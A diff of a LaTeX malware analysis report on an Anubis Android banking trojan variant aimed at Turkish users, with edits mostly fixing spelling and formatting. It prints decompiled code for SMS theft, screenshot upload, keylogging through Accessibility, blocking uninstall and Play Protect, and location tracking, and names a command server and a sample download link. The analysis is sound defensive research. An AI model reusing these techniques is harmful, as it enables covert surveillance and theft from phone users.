@@ -49,9 +49,9 @@ This work includes an analyzis of the Anubis malware variant \textbf{pandemidest
 \item[Source] https://dosya.org/f.php?h=0G8rhXAJ\&d=1
 \end{description}
 
-In December 2016 the the article "Android BOT from scratch" was published in which source code of a new Android banking trojan was shared. The first malware based on this code was spotted in January 2017 and from then on all derived Malware was called \textbf{BANKBOT}. Over time the malware was improved heavily and a second version of the malware was crafted named \textbf{ANUBIS}.\cite{ALLSTARTEDWITHBANKBOT} \cite{ANUBISTRENDMICRO}
+In December 2016 the article "Android BOT from scratch" was published in which source code of a new Android banking trojan was shared. The first malware based on this code was spotted in January 2017 and from then on all derived Malware was called \textbf{BANKBOT}. Over time the malware was improved heavily and a second version of the malware was crafted named \textbf{ANUBIS}.\cite{ALLSTARTEDWITHBANKBOT} \cite{ANUBISTRENDMICRO}
 
-In March 2020 an articel was published telling about banking Tojan campaigns against Turkish banks meming to ba "gift" of users mobile carrier due to COVID-19 Virus \ref{COVID19REF}. \cite{ANUBISTURKEY2020} 
+In March 2020 an article was published telling about banking Tojan campaigns against Turkish banks which pretends to be a "gift" by user's mobile carrier due to COVID-19 Virus \cite{COVID19REF}. \cite{ANUBISTURKEY2020} 
 
 
 Related work of an older version of the malware can be found here: https://medium.com/@fs0c131y/reverse-engineering-of-the-anubis-malware-part-1-741e12f5a6bd
@@ -76,15 +76,15 @@ Here are some facts to identify this version of the malware:
 \end{description}
 
 \subsection{RELATED WORK}
-In October 2018 the blogger \textbf{Elliot Anderson} published an analyzis of the at this time latest version of the Anubis malware \cite{REVEANUBIS}. In Google Play it was called "HD TV Italy" and had arround 1.000 downloads.
-His version of the malware was wrapped into a loader which loaded the acually code of the malware at runtime.
+In October 2018 the blogger \textbf{Elliot Anderson} published an analysis of the at this time latest version of the Anubis malware \cite{REVEANUBIS}. In Google Play it was called "HD TV Italy" and had around 1.000 downloads.
+His version of the malware was wrapped into a loader which loaded the actually code of the malware at runtime.
 
 \newpage
-\section{OBSERVED RUNTIME BEHAVIOUR} \label{runtimebehaviour}
+\section{OBSERVED RUNTIME BEHAVIOR} \label{runtimebehaviour}
 
 \subsection{THE TEST SYSTEM}
 
-Because this malware is targeted to turkey marked a test environment was applied that matches to the common share of android versions. An Android API of 26 represents the median of Android versions in turkey \cite{TURKEYANDROIDVERSIONS} and possibily let us explore more features of the malware since newer Android versions are more restricted. An Emulator is used in order to make reproduce the observations and debugging more easy (Intel x86 Atom System Image, API 26, Revision 1). A rooted image offers the option to debug the malware without the need of repackaging. In order to verify if the behaviour is equal to a real device this procedure will be done on a real device with same Android version.
+Because this malware is targeted to turkey marked a test environment was applied that matches to the common share of android versions. An Android API of 26 represents the median of Android versions in turkey \cite{TURKEYANDROIDVERSIONS} and possibly let us explore more features of the malware since newer Android versions are more restricted. An Emulator is used in order to make reproduce the observations and debugging more easy (Intel x86 Atom System Image, API 26, Revision 1). A rooted image offers the option to debug the malware without the need of repackaging. In order to verify if the behavior is equal to a real device this procedure will be done on a real device with same Android version.
 
 
 \subsection{INSTALLATION}
@@ -119,7 +119,7 @@ The data folder of the app at this stage has size about 2.11MB.
 
 
 \subsection{2. GRANT ACCESSIBILITY PERMISSION}
-In order to continue observation ofthe runtime behaviour the Accessibility permission has to be granted and the annoying popup of the Accessibility screen disappears.
+In order to continue observation of the runtime behavior the Accessibility permission has to be granted and the annoying popup of the Accessibility screen disappears.
 
 
 
@@ -128,38 +128,38 @@ Enter the Accessibility settings of "pandemistek" causes the settings screen to 
 \\  ( see video \textbf{settings\_closed\_when\_accessibility\_service\_info\_is\_entered.webm}).
 
 \subsection{4. UNINSTALL THE APP}
-While trying to uninstall the App from settings the Settings screen will be closed when App info screen get's visible (see video \textbf{settings\_closed\_when\_appinfo\_screen\_is\_entered.webm}).
+While trying to uninstall the App from settings the Settings screen will be closed when App info screen gets visible (see video \textbf{settings\_closed\_when\_appinfo\_screen\_is\_entered.webm}).
 
 \newpage
-\section{MALWARE ANALYZIS}
+\section{MALWARE ANALYSIS}
 This chapter is intended to highlight the functionality of the core features of the malware.
 
 \subsection{ENVIRONMENT}
-Several tools are used to analyze this malware. Some of them are intended for static code and others for runtime analyzis.
+Several tools are used to analyze this malware. Some of them are intended for static code and others for runtime analysis.
 
 \begin{description}
-\item[Android Studio] Android Studio offers the option to profile or debug APK's. It is possible review the App code in Smali code as well as attach the debugger in order to perform runtime analyzis. In order to debug release Apps a rooted device / emulator is required. (https://developer.android.com/studio)
+\item[Android Studio] Android Studio offers the option to profile or debug APK's. It is possible review the App code in Smali code as well as attach the debugger in order to perform runtime analysis. In order to debug release Apps a rooted device / emulator is required. (https://developer.android.com/studio)
 \item[Jadx] This tool decompiles the App source code into Java and supports searching for references and definition. 
 \\ (https://github.com/skylot/jadx)
-\item[bash] One of the most famous linux shells. Some scripts require bash.
-\item[grep] Very powerfull tool installed by default on most of Linux OS derivates.
-\item[frida (optional)] Crossplatform hooking framework with powerfull features. In this description we try to use the Java debugger but you could potentially perform the same actions using frida and place hooks to the described breakpoints.
+\item[bash] One of the most famous Linux shells. Some scripts require bash.
+\item[grep] Very powerful tool installed by default on most of Linux OS derivates.
+\item[frida (optional)] Cross-platform hooking framework with powerful features. In this description we try to use the Java debugger but you could potentially perform the same actions using frida and place hooks to the described breakpoints.
 \end{description}
 
 \subsubsection{DEBUGGER AND BREAKPOINTS}
 In order to analyze and understand how this malware works a debugger can be used to set breakpoints to important function invocations.
 
-Here is a list of breakoints used:
+Here is a list of breakpoints used:
 
 \begin{description}
 \item[android.view.accessibility.AccessibilityEvent.recycle()] Will be called after the accessibility event was processed by the anubis service. In the debugger the full event content is visible
 \item[android.os.IBinder.transact()] Will be called while communicate with Android middleware services. This can be used to record system calls made by the malware.
 \item[android.accessibilityservice.AccessibilityService.performGlobalAction] This can be used by the malware to inject some global events like press back button or home button etc.
-\item[java.net.URLConnection.connect] Monitor all connection of the malware done via URLConnection. This is discovered multiple times in source code mostly in the function \textit{naqsl.ebxcb.exu.fddo.int\$fddo.fddo()}
+\item[java.net.URLConnection.connect] Monitor all connection of the malware done via URLConnection. This is discovered multiple times in the source code mostly in the function \textit{naqsl.ebxcb.exu.fddo.int\$fddo.fddo()}
 \end{description}
 
 \subsubsection{API USAGE}
-In order to determine what Android API the malware is using the following snippet can be used to get a full list. Before doing that it's required to decompile the malware classes to smali code (REFERENCE smali).
+In order to determine what Android API the malware is using the following snippet can be used to get a full list. Before doing that it's required to decompile the malware classes to smali code.
 
 \begin{spverbatim}
 grep -oh -e "L.*;"  -R . | sort -u > ./used_classes.txt
@@ -167,16 +167,17 @@ grep -oh -e "L.*;"  -R . | sort -u > ./used_classes.txt
 
 This will produce output visible in listing \ref{usedclassesexample} and is used while research different malware features.
 
-\begin{lstlisting}[label=usedclassesexample,caption=Example output of the API usage script..,frame=tb]
+\begin{lstlisting}[label=usedclassesexample,caption=Example output of the API usage script.,frame=tb]
 Ldalvik/system/DexClassLoader;
-Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;
+Ldalvik/system/DexClassLoader;
+    -><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;
 Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;
 [...]
 \end{lstlisting}
 
 \newpage
 \subsubsection{THE MANIFEST} \label{manifest}
-Analyzing the \textit{AndroidManifest.xml} tells a lot about the power of the malware. Permissions for example can be used to identify possible device ressources the malware can access. Listing \ref{usedpermissions} lists all permissions the malware can be granted. Most of those permissions need the user to grant at runtime \cite[guide/topics/permissions/overview]{AndroidDev}.
+Analyzing the \textit{AndroidManifest.xml} tells a lot about the power of the malware. Permissions for example can be used to identify possible device resources the malware can access. Listing \ref{usedpermissions} lists all permissions the malware can be granted. Most of those permissions need the user to grant at runtime \cite[guide/topics/permissions/overview]{AndroidDev}.
 
 \begin{lstlisting}[label=usedpermissions,caption=Permissions defined in the Manifest of the malware,frame=tb]
 	<uses-permission
@@ -284,10 +285,10 @@ The version settings in the Manifest are telling that the malware code basis mus
 \end{lstlisting}
 
 \subsubsection{DATA STRUCTURE} \label{datastructure}
-After the malware was launched the data structure was analyzed. There was nothing to be found except of a \textit{SharedPreference} file located at \textbf{shared\_prefs/set.xml}. Listing \ref{sharedpreferences} lists the full content of this file. Some values of this configuration file are obfuscated (see more in chapter \ref{stringobf}.
+After the malware was launched the data structure was analyzed. There was nothing to be found except of a \textit{SharedPreference} file located at \textbf{shared\_prefs/set.xml}. Listing \ref{sharedpreferences} lists the full content of this file. Some values of this configuration file are obfuscated (see more in chapter \ref{stringobf}).
 
 Some interesting findings are the obfuscated \textit{urls} value, the \textit{url} value pointing to \textbf{http://hangikapi.com} (see a screenshot in figure \ref{fig:hangikapiscreenshot}).
-Analyzis of the Server side is not included in this work.
+Analysis of the Server side is not included in this work.
 
 \begin{figure}[H]
   \begin{center}
@@ -368,7 +369,7 @@ Analyzis of the Server side is not included in this work.
 
 \subsection{STARTUP AND INITIALIZATION}
 \subsubsection{RETRIEVE THE DEFAULT URL}
-Potentially a bot is inteded to communicate in order to retrieve commandos what to do. Also most of malware applications are collecting data and transfer them to somewehere. Mostly this is done via a Web server that collects data and provides resources the malware can fetch at runtime. Potentially the malware can fetch multiple of potential target URLs using an initial URL. This URL is very sensitive information because it tells a lot about the attacker and it could be forced to be shutdown by the government. Now this malware as well as most others is trying to obfuscate the default url(s). The function \textit{naqsl.ebxcb.exu.ifdf.ifdf()} is intended to deobfuscate those at runtime (see Listing \ref{deobfuscateurls}).
+Potentially a bot is intended to communicate in order to retrieve commandos what to do. Also most of malware applications are collecting data and transfer them to somewhere. Mostly this is done via a Web server that collects data and provides resources the malware can fetch at runtime. Potentially the malware can fetch multiple of potential target URLs using an initial URL. This URL is very sensitive information because it tells a lot about the attacker and it could be forced to be shutdown by the government. Now this malware as well as most others is trying to obfuscate the default url(s). The function \textit{naqsl.ebxcb.exu.ifdf.ifdf()} is intended to deobfuscate those at runtime (see Listing \ref{deobfuscateurls}).
 
 \begin{lstlisting}[label=deobfuscateurls,caption=The function \textit{naqsl.ebxcb.exu.ifdf.ifdf()} deobfuscates the default URLs.,frame=tb]
 
@@ -416,14 +417,15 @@ In general the definition what service is currently enabled or disabled is persi
 
 The Service \textit{naqsl.ebxcb.exu.ServiceCommands} is one of the core services of the malware. The service can be started with a command argument telling which attack shall be started. Most of features will be started and configured in this service. The function \textit{naqsl.ebxcb.exu.ServiceCommands.fddo()} is a very huge function intended to parse the command argument and configure the malware feature.
 
-In contrast the Service \textit{naqsl.ebxcb.exu.StartWhileGlobal} is the first background service started within the \textit{naqsl.ebxcb.exu.Activity.MainActivity} while the malware is launched first time. and is intended to perform the first commands when the malware gets launched. It starts some initial features like disable Google Play Protect (see more at \ref{playprotect}), upload the file system structure and more.
+In contrast the Service \textit{naqsl.ebxcb.exu.StartWhileGlobal} is the first background service started within the 
+\\ \textit{naqsl.ebxcb.exu.Activity.MainActivity} while the malware is launched first time. and is intended to perform the first commands when the malware gets launched. It starts some initial features like disable Google Play Protect (see more at \ref{playprotect}), upload the file system structure and more.
 
 \newpage
 \subsection{MALWARE FEATURES}
-The malware offers multiple feauteres which can be enabled or disabled from remote servers. The following list will give a rough overview of them.
+The malware offers multiple features which can be enabled or disabled from remote servers. The following list will give a rough overview of them.
 
 \begin{description}
-\item[String obfuscation (chapter \ref{stringobf}] Nearly all strings in bytecode and some generated at runtime are obfuscated using Base64.
+\item[String obfuscation (chapter \ref{stringobf})] Nearly all strings in bytecode and some generated at runtime are obfuscated using Base64.
 \item[Hide app (chapter \ref{hideapp})] After the malware app was launched by the user the malware icon disappears from the launcher
 \item[Screenshot (chapter \ref{screenshot}] The malware is able to perform screenshots and transfer them to a Web server
 \item[SMS stealing (chapter \ref{smsstealing})] The malware can read sms messages and transfer them to a web server
@@ -445,7 +447,7 @@ The next chapters will explain most of the features listed above.
 
 
 \newpage
-\subsubsection{SRING OBFUSCATION} \label{stringobf}
+\subsubsection{STRING OBFUSCATION} \label{stringobf}
 
 The malware obfuscates it's hardcoded strings in the dex bytecode as well as some runtime generated strings passed into the \textit{SharedPreferences}.
 
@@ -468,7 +470,7 @@ Some strings are obfuscated twice, mostly that strings generated at runtime and 
 
 
 \subsubsection{HIDE APP ICON} \label{hideapp}
-In order to hide itself the malware disables the \textit{MainActivity} component using the \textit{setComponentEnabledSetting} function and passing the parameter \textit{COMPONENT\_ENABLED\_STATE\_DISABLED} (see Listing \ref{mainactivityoncreate}. This causes the App icon to dissapear \cite[reference/android/content/pm/PackageManager]{AndroidDev}.
+In order to hide itself the malware disables the \textit{MainActivity} component using the \textit{setComponentEnabledSetting} function and passing the parameter \textit{COMPONENT\_ENABLED\_STATE\_DISABLED} (see Listing \ref{mainactivityoncreate}. This causes the App icon to disappear \cite[reference/android/content/pm/PackageManager]{AndroidDev}.
 
 \begin{lstlisting}[label=mainactivityoncreate,caption=\textit{MainActivity.onCreate} calls \textit{setComponentEnabledSetting} with \textit{COMPONENT\_ENABLED\_STATE\_DISABLED} parameter in order to let the App icon disappear in the launcher.,frame=tb]
 public class MainActivity extends Activity {
@@ -481,7 +483,8 @@ public class MainActivity extends Activity {
 
 \newpage
 \subsubsection{SCREENSHOT} \label{screenshot}
-The API usages showed that the malware is using the \textit{android.media.projection.MediaProjectionManager.createScreenCaptureIntent()} function inside the \textit{naqsl.ebxcb.exu.API.Screenshot.ActivityScreenshot}Activity (see Listing \ref{mediaprojmanagerapiusage}). 
+The API usages showed that the malware is using the 
+\\ \textit{android.media.projection.MediaProjectionManager.createScreenCaptureIntent()} function inside the \textit{naqsl.ebxcb.exu.API.Screenshot.ActivityScreenshot}Activity (see Listing \ref{mediaprojmanagerapiusage}). 
 
 \begin{lstlisting}[label=mediaprojmanagerapiusage,caption=List of calls to \textit{android.media.projection.MediaProjectionManager.createScreenCaptureIntent} tells that the malware tries to do screenshots.,frame=tb]
 Landroid/media/projection/MediaProjectionManager;
@@ -496,8 +499,8 @@ In the \textit{naqsl.ebxcb.exu.API.Screenshot.ActivityScreenshot.onCreate}
 function \textit{startActivityForResult} is called with the screen-capture intent as parameter. Once the screenshot request was processed the \textit{onActivityResult} is called with passes the results into an intent intended to start the \textit{naqsl.ebxcb.exu.API.Screenshot.ServiceScreenshot} service.
 
 Here the \textit{android.media.projection.MediaProjectionManager.getMediaProjection}
-is called which parses the results and returns a \textit{android.media.projection.MediaProjection} object. This will be passed as argument into a call to \textit{android.media.projection.MediaProjection.createVirtualDisplay}
-. Once a screenshot was made the function \textit{naqsl.ebxcb.exu.API.Screenshot.onImageAvailable} will be called. Here the image will be decoded and asynchronous written into a file called \textbf{screenshot.jpg} (see Listing \ref{savescreenshot}).
+is called which parses the results and returns a \textit{android.media.projection.MediaProjection} object. This will be passed as argument into a call to 
+\\ \textit{android.media.projection.MediaProjection.createVirtualDisplay}. Once a screenshot was made the function \textit{naqsl.ebxcb.exu.API.Screenshot.onImageAvailable} will be called. Here the image will be decoded and asynchronous written into a file called \textbf{screenshot.jpg} (see Listing \ref{savescreenshot}).
 \begin{lstlisting}[label=savescreenshot,caption=The malware stores the screenshot into the external files dir with filename \textbf{screenshot.jpg}.,frame=tb]
             File file = new File(
                               ServiceScreenshot.this.getExternalFilesDir(null),
@@ -510,7 +513,7 @@ is called which parses the results and returns a \textit{android.media.projectio
 Meanwhile the Service \textit{naqsl.ebxcb.exu.API.Screenshot.ServiceSendRequestImageVNC} will be started which is intended to send the image to a Web server. The function \textit{naqsl.ebxcb.exu.API.Screenshot.ServiceSendRequestImageVNC.onHandleIntent}
 reads the image from disk and passes it together with the target url into the function \textit{intR.fddo} (see Listing \ref{servicesendrequestimageonhandleintent}).
 
-\begin{lstlisting}[label=servicesendrequestimageonhandleintent,caption=The function \textit{naqsl.ebxcb.exu.API.Screenshot.ServiceSendRequestImageVNC.onHandleIntent} writes the file to disk as well as invokes the \textit{naqsl.ebxcb.exu.Cint.fddo()} function which is inteded to send the data to a Web server.,frame=tb]
+\begin{lstlisting}[label=servicesendrequestimageonhandleintent,caption=The function \textit{naqsl.ebxcb.exu.API.Screenshot.ServiceSendRequestImageVNC.onHandleIntent} writes the file to disk as well as invokes the \textit{naqsl.ebxcb.exu.Cint.fddo()} function which is intended to send the data to a Web server.,frame=tb]
     public void onHandleIntent(Intent intent) {
         Cint intR = new Cint();
         String str = "vnc";
@@ -602,21 +605,12 @@ public void fddo(Context context, byte[] bArr, String str) {
 
 \newpage
 \subsubsection{SMS STEALING} \label{smsstealing}
-The Activity \textit{naqsl.ebxcb.exu.Activity.ActivityGetSMS} implements the database interaction to read SMS messages from. The function \textit{naqsl.ebxcb.exu.Activity.ActivityGetSMS.onCreate} defines what database tables to select for perform the queries (see Table XX) and calls the function \textit{naqsl.ebxcb.exu.Activity.ActivityGetSMS.fddo}.
+The Activity \textit{naqsl.ebxcb.exu.Activity.ActivityGetSMS} implements the database interaction to read SMS messages from. The function \textit{naqsl.ebxcb.exu.Activity.ActivityGetSMS.onCreate} defines what database tables to select for perform the queries (\textbf{sms/sent, sms/inbox, sms/draft}) and calls the function \textit{naqsl.ebxcb.exu.Activity.ActivityGetSMS.fddo}.
 
-\begin{description}
-\item[sms/sent]
-\item[sms/inbox]
-\item[sms/draft]
-\end{description}
-\begin{center}
-Table XX: Tables of SMS message to be fetched from database.
-\end{center}
+The \textit{naqsl.ebxcb.exu.Activity.ActivityGetSMS.fddo} function performs the database retrieves a \textit{ContentResolver} and performs the query. It iterates through all entries and adds them using a hardcoded pattern to a string. This string will be returned to the \textit{naqsl.ebxcb.exu.Activity.ActivityGetSMS.onCreate}  function. Here the function \textit{naqsl.ebxcb.exu.int.fddo(Context context, String str, String str2)} will be called in order to send the results to a Web server. The second argument is a hardcoded string "4" and the third argument are the SMS messages. Depending on the second argument the target url will be created (see Listing \ref{activitygetssmsfddo}). Next is to gather the \textbf{url} tag from \textit{SharedPreferences} (see chapter: \ref{datastructure}) and execute the \textit{android.os.AsyncTask.Cint\$fddo} task wich is transfer the data to the web backend using the (java.net.HttpURLConnection).
 
-The \textit{naqsl.ebxcb.exu.Activity.ActivityGetSMS.fddo} function performs the database retrieves a \textit{ContentResolver} and performs the query. It iterates through all entries and adds them using a hardcoded pattern to a string. This string will be returned to the \textit{naqsl.ebxcb.exu.Activity.ActivityGetSMS.onCreate}  function. Here the function \textit{naqsl.ebxcb.exu.int.fddo(Context context, String str, String str2)} will be called in order to send the results to a Web server. The second argument is a hardcoded string "4" and the third argument are the SMS messages. Depending on the second argument the target url will be created (see Listing XX). Next is to gather the \textbf{url} tag from \textit{SharedPreferences} (see chapter: \ref{datastructure}) and execute the \textit{android.os.AsyncTask.Cint\$fddo} task wich is transfer the data to the web backend using the ( 	java.net.HttpURLConnection).
-
-\begin{lstlisting}[label=mainactivityoncreate,caption=
-Listing XX: Function \textit{naqsl.ebxcb.exu.Activity.ActivityGetSMS.fddo} builds the target url and calls the \textit{intR.fddo()} function which initiates the data upload.,frame=tb]
+\begin{lstlisting}[label=activitygetssmsfddo,caption=
+Function \textit{naqsl.ebxcb.exu.Activity.ActivityGetSMS.fddo} builds the target url and calls the \textit{intR.fddo()} function which initiates the data upload.,frame=tb]
  public String fddo(Context context, String str, String str2) {
         String str3;
         String str4 = "PHRhZz48L3RhZz4="; // <tag></tag>
@@ -646,13 +640,13 @@ Listing XX: Function \textit{naqsl.ebxcb.exu.Activity.ActivityGetSMS.fddo} build
 \end{lstlisting}
 
 
-This attack will be started from the \textit{naqsl.ebxcb.exu.ServiceCommands} Service (read more in chapter \ref{featureselection}.
+This attack will be started from the \textit{naqsl.ebxcb.exu.ServiceCommands} Service (read more in chapter \ref{featureselection}).
 
 \newpage
 \subsubsection{SMS SPAM} \label{smsspam}
 This is the full list of API calls of the malware to the \textit{android.telephony.SmsManager}. The list tells that the malware is interacting with the \textit{android.telephony.SmsManager} and is going to send SMS messages.
 
-\begin{spverbatim}
+\begin{lstlisting}[label=smsmanagersendmultiparttextmessage,caption=List of API calls to \textit{android.telephony.SmsManager} showing that the malware create messages and sends them via the \textit{android.telephony.SmsManager.sendMultipartTextMessage} call.,frame=tb]
 Landroid/telephony/SmsManager;->divideMessage(Ljava/lang/String;)Ljava/util/ArrayList;
 Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;
 Landroid/telephony/SmsManager;
@@ -664,10 +658,7 @@ Landroid/telephony/SmsManager;
 Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;
 Landroid/telephony/SmsMessage;->getDisplayMessageBody()Ljava/lang/String;
 Landroid/telephony/SmsMessage;->getDisplayOriginatingAddress()Ljava/lang/String;
-\end{spverbatim}
-\begin{center}
-Listing XX: List of API calls to \textit{android.telephony.SmsManager} showing that the malware create messages and sends them via the \textit{android.telephony.SmsManager.sendMultipartTextMessage} call.
-\end{center}
+\end{lstlisting}
 
 The Activity \textit{naqsl.ebxcb.exu.Activity.ActivityGetNumber} implements the method 
 \\ \textit{naqsl.ebxcb.exu.Activity.ActivityGetNumber.fddo(ContentResolver contentResolver, String str)} which is intended to query the phone numbers from the address book using the \textit{ContentResolver.query()} API function (see Listing \ref{activitygetnumberfddo}). While iterating through the entries each row of the table will be parsed and passed as argument to the call of the function \textit{this.f559fddo.m447int(this, string, str);}
@@ -778,14 +769,14 @@ As the API calls list and the Manifest tells, the malware is able to setup an \t
 \item[Collect UI actions] Record every Touch / Click and every keystroke done by the user 
 \end{description}
 \begin{center}
-Table XX: List of Accessibility features on Android accessibile for enabled Accessibility services \cite{ExploitingAccessibilityInOperatingSystems}.
+Table 1: List of Accessibility features on Android accessible for enabled Accessibility services \cite{ExploitingAccessibilityInOperatingSystems}.
 \end{center}
 
 Listing \ref{listofaccessibilitycalls} lists all API calls to the Accessibility Framework of Android. The call to \textit{android.view.accessibility.AccessibilityNodeInfo.findAccessibilityNodeInfosByText()} can be used to search for UI widgets like password fields, credit card number fields, etc. and gather their text using the \textit{android.view.accessibility.AccessibilityNodeInfo.getText()} function. Also input events can be gathered by listen for \textit{android.view.accessibility./AccessibilityEvent} actions and gather their text by calling 
 \\ \textit{android.view.accessibility.AccessibilityEvent.getText()} \cite[/reference/android/view/accessibility/AccessibilityRecord\#getText()]{AndroidDev}. Additionally the malware has the power to close Activities by using the 
 \\ \textit{android.accessibilityservice.AccessibilityService.performGlobalAction} function and passing the corresponding params. This can be used to close the Settings screen when the user tries to uninstall the malware \cite[/reference/android/accessibilityservice/AccessibilityService\#performGlobalAction(int)]{AndroidDev}.
 
-\begin{lstlisting}[label=listofaccessibilitycalls,caption=List of calls to the Accessibility framework of Android. The malware is searching for UI widgests as well as performs global actions (can dismiss Activities like Settings) and gather text entered into UI widgets.,frame=tb]
+\begin{lstlisting}[label=listofaccessibilitycalls,caption=List of calls to the Accessibility framework of Android. The malware is searching for UI widgets as well as performs global actions (can dismiss Activities like Settings) and gather text entered into UI widgets.,frame=tb]
 Landroid/view/accessibility/AccessibilityEvent;
 Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;
 Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;
@@ -814,7 +805,7 @@ Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
 
 In order to approve that the malware is going to log the input events of Apps the debugger was used to track the input events.
 
-Figure \ref{fig:accessibility_event_bp} is showing the Android web browser while the string "test123" is entered into the searchbar. On the right side of the emulator the debugger output is visible that shows the contents of the AccessibilityEvent received by the malware. The member mText contains a list of spannable strings, in our case with one item with text "test123". So at this point it's certain that this malware is able to collect user input and window content.
+Figure \ref{fig:accessibility_event_bp} is showing the Android web browser while the string "test123" is entered into the search-bar. On the right side of the emulator the debugger output is visible that shows the contents of the AccessibilityEvent received by the malware. The member mText contains a list of spannable strings, in our case with one item with text "test123". So at this point it's certain that this malware is able to collect user input and window content.
 
 %\linewidth%
 
@@ -827,9 +818,9 @@ Figure \ref{fig:accessibility_event_bp} is showing the Android web browser while
 \end{figure}
 
 
-The class \textit{naqsl.ebxcb.exu.ServiceAccessibility} implements the function \textit{naqsl.ebxcb.exu.ServiceAccessibility.onAccessibilityEvent} which is beeing triggered on every Accessibility interaction forwarded by the operating system. Here the malware is performing multiple actions depending on what is currently shown to the user.
+The class \textit{naqsl.ebxcb.exu.ServiceAccessibility} implements the function \textit{naqsl.ebxcb.exu.ServiceAccessibility.onAccessibilityEvent} which is being triggered on every Accessibility interaction forwarded by the operating system. Here the malware is performing multiple actions depending on what is currently shown to the user.
 
-For example if the user enters the Google Play Protect settings screen in order to enable Google Play Protect the Accessibility service will quit the settings screen bofe the user can do any interaction with it (see Listing \ref{onaccessibilityserviceclosesettings}).
+For example if the user enters the Google Play Protect settings screen in order to enable Google Play Protect the Accessibility service will quit the settings screen before the user can do any interaction with it (see Listing \ref{onaccessibilityserviceclosesettings}).
 
 \newpage
 \begin{lstlisting}[label=onaccessibilityserviceclosesettings,caption=The \textit{AccessiblityService} is able to detect wether a user is trying to enable Google Play Protect and leaves the screen using the \textit{naqsl.ebxcb.exu.ServiceAccessibility.fddo()} function.,frame=tb]
@@ -850,9 +841,9 @@ public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent r
 \end{lstlisting}
 
 
-The function \textit{naqsl.ebxcb.exu.ServiceAccessibility.fddo()} enforces the current Activity to be closed by performing multiple global actions or starting the Launcher intent what causes to let the Launcher to come on top of the screen (see Listing \ref{serviceaccessibilityglobalaction}.
+The function \textit{naqsl.ebxcb.exu.ServiceAccessibility.fddo()} enforces the current Activity to be closed by performing multiple global actions or starting the Launcher intent what causes to let the Launcher to come on top of the screen (see Listing \ref{serviceaccessibilityglobalaction}).
 
-\begin{lstlisting}[label=serviceaccessibilityglobalaction,caption=The function \textit{naqsl.ebxcb.exu.ServiceAccessibility.fddo()} presses three times back and then leaves the current App or calls \textit{android.app.Activity.startActivity()} using the Launcher intent in order to bring the Launcher on top of the streen.,frame=tb]
+\begin{lstlisting}[label=serviceaccessibilityglobalaction,caption=The function \textit{naqsl.ebxcb.exu.ServiceAccessibility.fddo()} presses three times back and then leaves the current App or calls \textit{android.app.Activity.startActivity()} using the Launcher intent in order to bring the Launcher on top of the screen.,frame=tb]
     public void fddo() {
         if (VERSION.SDK_INT >= 16) {
             performGlobalAction(1); // GLOBAL_ACTION_BACK
@@ -879,7 +870,7 @@ Here is a list of actions the Accessibility service tries to prevent:
 \item[Prevent withdraw permissions of malware] The malware is trying to prevent the user from withdraw Accessibility permission.
 \end{description}
 
-In order to gather the \textit{android.permission.BIND\_ACCESSIBILITY} permission which let the operating system start the Accessibility Service the user has to approve the permission from settings. In order to enforce the user to do that the Service \textit{naqsl.ebxcb.exu.StartWhileRequest} launches the Activity \textit{naqsl.ebxcb.exu.Activity.ActivityAccessibility} frequently in a loop till the Accessibility permission is granted (see Listing \ref{startwhilerequeststartsactivityaccessibility}. Also a \textit{Toast} message will be shown telling the user to grant Accessibility permission to the malware.
+In order to gather the \textit{android.permission.BIND\_ACCESSIBILITY} permission which let the operating system start the Accessibility Service the user has to approve the permission from settings. In order to enforce the user to do that the Service \textit{naqsl.ebxcb.exu.StartWhileRequest} launches the Activity \textit{naqsl.ebxcb.exu.Activity.ActivityAccessibility} frequently in a loop till the Accessibility permission is granted (see Listing \ref{startwhilerequeststartsactivityaccessibility}). Also a \textit{Toast} message will be shown telling the user to grant Accessibility permission to the malware.
 
 \newpage
 \begin{lstlisting}[label=startwhilerequeststartsactivityaccessibility,caption=The Service \textit{naqsl.ebxcb.exu.StartWhileRequest} starts the \textit{naqsl.ebxcb.exu.Activity.ActivityAccessibility} frequently in a loop till the Accessibility permission was granted.,frame=tb]
@@ -928,7 +919,9 @@ The Keylogger of the malware is a very powerfull implementation that not only st
 
 \newpage
 \subsubsection{LOCATION TRACKING} \label{locationtracking}
-The service \textit{naqsl.ebxcb.exu.ServiceGeolocationGPS} and \textit{naqsl.ebxcb.exu.ServiceGeolocationNetwork} are Services intended to track the Location of the device. Both services are implementing a \textit{android.location.LocationListener} (see Listing \ref{locationchangedlistener}), asking for Runtime permissions like \textit{android.permission.ACCESS\_FINE\_LOCATION}, call the function \textit{android.location.LocationManager.requestLocationUpdates()} and send the results via the function \textit{naqsl.ebxcb.exu.Cint.fddo(Context context, String str, String str2)} (see chapter \ref{screenshot}, Listing \textit{locationifdf} and Listing XX(the function)XX.
+The service \textit{naqsl.ebxcb.exu.ServiceGeolocationGPS} and \textit{naqsl.ebxcb.exu.ServiceGeolocationNetwork} are Services intended to track the Location of the device. Both services are implementing a \textit{android.location.LocationListener} (see Listing \ref{locationchangedlistener}), asking for Runtime permissions like \textit{android.permission.ACCESS\_FINE\_LOCATION}, call the function 
+\\ \textit{android.location.LocationManager.requestLocationUpdates()} and send the results via the function 
+\\ \textit{naqsl.ebxcb.exu.Cint.fddo(Context context, String str, String str2)} (see chapter \ref{screenshot} and Listing \ref{locationifdf}).
 
 \begin{lstlisting}[label=locationchangedlistener,caption=The \textit{onLocationChanged} function calls ifdf which is intended to send the data to a Web server.,frame=tb]
     class fddo implements LocationListener {
